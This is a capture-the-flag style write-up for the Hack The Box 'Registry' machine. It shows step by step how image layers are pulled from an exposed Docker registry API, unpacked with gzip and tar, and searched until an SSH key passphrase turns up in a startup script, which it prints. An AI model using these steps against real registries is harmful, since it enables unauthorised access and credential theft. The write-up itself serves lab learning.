# Alternative way to exploit Registry

## Extracting files from Docker image file

Instead of login into the Docker registry, the image file can be downloaded and contains blob names that can be downloaded individually.

Pulling the image:
```
GET /v2/bolt-image/manifests/latest
```

Blob names in the image file:
```
(...)
"fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
      },
      {
         "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
      },
      {
         "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
      },
      {
         "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
      },
      {
         "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
      },
      {
         "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
      }
  ],
(...)
```

Downloading one blob:
```
http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
```

The command `file` identifies the file as _gzip compressed data_:
Decompressing _gzip_ file:
```
gzip -d sha256-302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz
```

The command `file` identifies the decompressed file as a _tar archive_.
Decompressing _tar_ file:
```
tar -xvf sha256-302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar
```

It extracts one file:
```
etc/profile.d/01-ssh.sh
```

This file is a bash script that contains a password for a SSH key from _bolt_:
```
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

This method can be done with every blob to get different directories and files from the container.
